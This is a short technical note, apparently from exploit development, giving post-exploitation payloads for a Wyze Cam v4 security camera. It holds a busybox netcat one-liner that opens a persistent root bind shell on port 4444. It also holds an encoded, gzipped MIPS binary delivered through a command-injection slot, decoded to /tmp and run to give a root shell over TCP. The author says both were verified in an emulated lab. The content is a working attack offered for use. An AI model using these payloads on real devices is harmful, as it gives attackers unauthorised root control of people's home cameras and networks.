# Post-exploitation payload for Wyze Cam v4

**First choice: no payload at all.** The initramfs busybox has the `nc` applet (not symlinked, so
`/bin/nc` fails, but `/bin/busybox nc` works). This 38-byte command is a persistent root shell:

    /bin/busybox nc -lk -p 4444 -e sh&

Use the ELF below only if a unit's busybox lacks `nc -e`.


wyze-shsrv.mips.el is a 920-byte MIPS32 ELF (pure syscalls, no libc). It listens on TCP 4444 and
gives /bin/sh as root. wyze-shsrv.S is its source.

The camera has no fetch client (no wget/nc/tftp in the initramfs busybox), so delivery is one
inline command from the RA-control exploit. This exact string (680 bytes) fits the ~900-byte
command slot left in the frame tail:

echo H4sIAAAAAAAC/41TMUvDQBh9uSZtRMG2OIg4BEyhOiQOTlLxOigWVAoKLi4p1lqQWpsruLWDg7P/wKGTuPcXOPcf6Ojg0EVwq98llzaWCj54d/m+792Xu8tLZ+9wX9M0RGAwIaMhOLZo7jIglUZzCxZ05JFCEgmg2adanzSSy/QsqRPNsE1zQMOAaoOpuuTkbTzgOyUkDZlKh/Ugl+EByxRLJlU9hMVo2wamIBKJ6RSsRx47n24zGDZ1s8/SzF6gXK7LaRdzhdXseo7OT7V8L3Nuki7f02G9mMScBZbLW1qa1pWidZTTqddxLKZT2AdR/MApZwW5t8VIQ/ueilks5tAL75l7m8MoDDM9mpOFpeyr/Ryrf6j694x6h873pJ4l3Eq94fpXcG+BW4R3KvGp7laiXDw92JHCbdenEXqW4y8UF2moNdrQUvJrGnD8K1+0hFeBc1QqnzhepX557dV8OK1qrd64vIEjqncCzoUnPDi01PGEaNUrbVH18W/MEzfIV2zsu9BTEUwVr4Q+CXSh/37rdBWvKR8mldeHwTxBZLN1pUuou5O+LM/QucSv0egmym+ymFVjno96jf8A0u3O0P0AQ+VsJZgDAAA=|/bin/base64 -d|/bin/gunzip>/tmp/x;/bin/chmod +x /tmp/x;/tmp/x&

Use /bin/... for every applet: a bare base64 resolves to a busybox applet in a way that swallows
-d under the lab qemu.

Verified in the qemu lab: the one-liner produces a 920-byte executable /tmp/x and running it gives
uid=0(root) over TCP. Not yet run on a real unit.
